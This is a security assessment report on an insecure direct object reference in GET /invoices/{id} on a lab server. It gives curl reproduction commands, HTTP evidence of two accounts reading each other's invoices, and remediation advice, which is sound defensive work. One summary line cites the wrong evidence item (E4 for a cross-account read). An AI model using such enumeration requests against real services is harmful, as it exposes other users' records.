# Missing object-level authorization on GET /invoices/{id} at lab:8080

**Severity:** High — cross-account disclosure of another user's invoice data is demonstrated with a single plain GET using any valid account; the only precondition is possession of some valid bearer token (moderate barrier per rubric: "some auth"). Not rated Critical because demonstrated impact is read disclosure of two concrete objects, not full compromise or mass data loss.

**Affected assets:** `http://lab:8080` — endpoint `GET /invoices/{id}`, tested objects `/invoices/101` (owner `alice`) and `/invoices/202` (owner `bob`), tested accounts `alice` and `bob`.

**Summary:** `GET /invoices/{id}` requires a valid bearer token but does not verify that the token's account owns the requested invoice. Both accounts successfully read each other's invoice object in full (E4, E6). Authentication is enforced (E1–E3); the missing control is the per-object ownership check.

## Reproduction

All requests are read-only (GET) and were run against `http://lab:8080` with curl. Account tokens are the lab credentials supplied for this test.

1. Unauthenticated baseline (expect 401):

   ```
   curl -s -i http://lab:8080/invoices/101
   ```

2. Invalid-token baseline (expect 401):

   ```
   curl -s -i -H "Authorization: Bearer lab-unknown" http://lab:8080/invoices/101
   ```

3. Own-object access by `alice` (expect 200):

   ```
   curl -s -i -H "Authorization: Bearer lab-alice" http://lab:8080/invoices/101
   ```

4. Cross-account access — `alice` reads `bob`'s invoice (observed 200):

   ```
   curl -s -i -H "Authorization: Bearer lab-alice" http://lab:8080/invoices/202
   ```

5. Own-object access by `bob` (expect 200):

   ```
   curl -s -i -H "Authorization: Bearer lab-bob" http://lab:8080/invoices/202
   ```

6. Cross-account access — `bob` reads `alice`'s invoice (observed 200):

   ```
   curl -s -i -H "Authorization: Bearer lab-bob" http://lab:8080/invoices/101
   ```

7. Nonexistent-object control (expect 404 with a valid token):

   ```
   curl -s -i -H "Authorization: Bearer lab-alice" http://lab:8080/invoices/999
   ```

## Evidence

Request/response pairs below. Timestamps are from the `Date` response header.

**E1 — unauthenticated, /invoices/101** (step 1)

```
GET /invoices/101 HTTP/1.1
Host: lab:8080

HTTP/1.1 401 Unauthorized
content-type: application/json
Date: Tue, 08 Sep 2026 07:31:44 GMT
Transfer-Encoding: chunked

{"error":"authentication required"}
```

**E2 — unauthenticated, /invoices/202** (step 1, second object)

```
GET /invoices/202 HTTP/1.1
Host: lab:8080

HTTP/1.1 401 Unauthorized
content-type: application/json
Date: Tue, 08 Sep 2026 07:31:44 GMT
Transfer-Encoding: chunked

{"error":"authentication required"}
```

**E3 — invalid token, /invoices/101** (step 2)

```
GET /invoices/101 HTTP/1.1
Host: lab:8080
Authorization: Bearer lab-unknown

HTTP/1.1 401 Unauthorized
content-type: application/json
Date: Tue, 08 Sep 2026 07:32:41 GMT
Transfer-Encoding: chunked

{"error":"authentication required"}
```

**E4 — own object: alice → /invoices/101** (step 3)

```
GET /invoices/101 HTTP/1.1
Host: lab:8080
Authorization: Bearer lab-alice

HTTP/1.1 200 OK
content-type: application/json
Date: Tue, 08 Sep 2026 07:32:03 GMT
Content-Length: 38

{"id":101,"owner":"alice","amount":35}
```

**E5 — CROSS-ACCOUNT: alice → /invoices/202** (step 4)

```
GET /invoices/202 HTTP/1.1
Host: lab:8080
Authorization: Bearer lab-alice

HTTP/1.1 200 OK
content-type: application/json
Date: Tue, 08 Sep 2026 07:32:03 GMT
Content-Length: 36

{"id":202,"owner":"bob","amount":99}
```

**E6 — CROSS-ACCOUNT: bob → /invoices/101** (step 6)

```
GET /invoices/101 HTTP/1.1
Host: lab:8080
Authorization: Bearer lab-bob

HTTP/1.1 200 OK
content-type: application/json
Date: Tue, 08 Sep 2026 07:32:03 GMT
Content-Length: 38

{"id":101,"owner":"alice","amount":35}
```

**E7 — own object: bob → /invoices/202** (step 5)

```
GET /invoices/202 HTTP/1.1
Host: lab:8080
Authorization: Bearer lab-bob

HTTP/1.1 200 OK
content-type: application/json
Date: Tue, 08 Sep 2026 07:32:03 GMT
Content-Length: 36

{"id":202,"owner":"bob","amount":99}
```

**E8 — nonexistent object: alice → /invoices/999** (step 7)

```
GET /invoices/999 HTTP/1.1
Host: lab:8080
Authorization: Bearer lab-alice

HTTP/1.1 404 Not Found
content-type: application/json
Date: Tue, 08 Sep 2026 07:32:41 GMT
Transfer-Encoding: chunked

{"error":"not found"}
```

## Impact

- Any authenticated user can read any invoice by id. Demonstrated: `alice` received `bob`'s invoice in full — fields `id`, `owner`, `amount` (E5) — and `bob` received `alice`'s invoice in full (E6).
- The cross-account response bodies are byte-identical to the owner's own-object responses (compare E5 vs E7, E6 vs E4), so the reader obtains exactly what the owner obtains.
- Invoices are identified by sequential integer ids (101, 202 observed), so object enumeration by id is a viable path for an authenticated user (id space inferred from the two observed ids only).

## Exploitability constraints

- Requires a valid bearer token: unauthenticated and invalid-token requests are rejected with 401 (E1–E3). Any legitimate account suffices; no privilege or role beyond basic authentication is required.
- Demonstrated on the `GET` method only.
- Demonstrated between the two tested accounts, `alice` and `bob`, on the two tested objects, `/invoices/101` and `/invoices/202`.

## Tested behavior vs untested possibilities

Tested (this assessment):

- `GET` on `/invoices/101` and `/invoices/202` with: no token, an invalid token, the owning token, and the non-owning token (E1–E7).
- `GET` on a nonexistent id with a valid token (E8).

Not tested — do not assume these conclusions:

- Other methods (POST, PUT, PATCH, DELETE) on `/invoices/{id}`: not exercised, so write-level cross-account modification is possible but unproven.
- Other endpoints (e.g., invoice list/collection routes): not exercised.
- More accounts or objects: only `alice`/`bob` and objects 101/202 were in scope for this test.
- The exact cause in the implementation (missing owner check vs. token not carrying identity): the behavior is proven; the root-cause location is not, since the target is read-only for this assessment.

## False-positive check

- 401 vs 200 is attributable to the token, not to object existence: the same object `/invoices/101` returns 401 with no/invalid token (E1, E3) and 200 with any valid token (E4, E6); `/invoices/999` returns 404 with a valid token (E8), showing the 200 responses are genuine object reads, not an always-200 endpoint.
- Cross-account result is not a caching artifact: the same request sequence produced the other account's data with matching `Content-Length` (36 for 202, 38 for 101) in both directions (E5, E6).
- Ownership is explicit in the data: each response carries an `owner` field, and in E5/E6 it differs from the requesting account, so the mismatch between requester and owner is directly observable in the response.

## Remediation

In the handler for `GET /invoices/{id}`, after authenticating the bearer token, load the invoice and compare its `owner` to the authenticated principal before returning the body; if they differ, return 403 (e.g., `{"error":"forbidden"}`) with no invoice fields in the body. Specifically:

1. Derive the principal from the validated token (the same identity used to issue `lab-alice`/`lab-bob` sessions).
2. In the invoice lookup path, reject with 403 when `invoice.owner != principal` instead of returning the record.
3. Apply the same ownership check to any other method on `/invoices/{id}` once they are implemented or enabled (untested here), and to any collection endpoint that exposes invoice records.
4. Add a regression test asserting that a valid token for account X gets 403 on an object owned by account Y, and 200 only on its own objects.

## Limitations

- Scope: object-level authorization on `GET /invoices/{id}` at `http://lab:8080` only; accounts `alice` and `bob`; objects 101 and 202.
- Read-only assessment: no mutating requests were sent; the target was not modified.
- Fields considered are only those present in the observed responses: `id`, `owner`, `amount`.

## Evidence index

| ID | Claim supported |
|---|---|
| E1 | Unauthenticated GET /invoices/101 → 401 |
| E2 | Unauthenticated GET /invoices/202 → 401 |
| E3 | Invalid token → 401 (authentication is enforced) |
| E4 | alice reads own /invoices/101 → 200 |
| E5 | alice reads bob's /invoices/202 → 200 (cross-account) |
| E6 | bob reads alice's /invoices/101 → 200 (cross-account) |
| E7 | bob reads own /invoices/202 → 200 |
| E8 | Valid token on nonexistent id → 404 (200s are real reads) |
